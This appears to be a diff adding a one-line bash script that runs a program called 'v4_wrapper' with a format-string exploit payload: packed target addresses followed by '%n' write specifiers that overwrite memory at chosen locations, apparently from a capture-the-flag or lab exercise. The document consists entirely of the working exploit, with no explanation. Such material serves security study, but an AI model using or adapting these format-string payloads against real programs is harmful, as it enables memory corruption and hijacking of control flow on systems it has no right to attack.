@@ -1,0 +1,4 @@
+#!/bin/bash
+
+./v4_wrapper `printf "\x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08"`A%108\$n%5\$0206d%109\$n%5\$032d%110\$n%111\$n
+
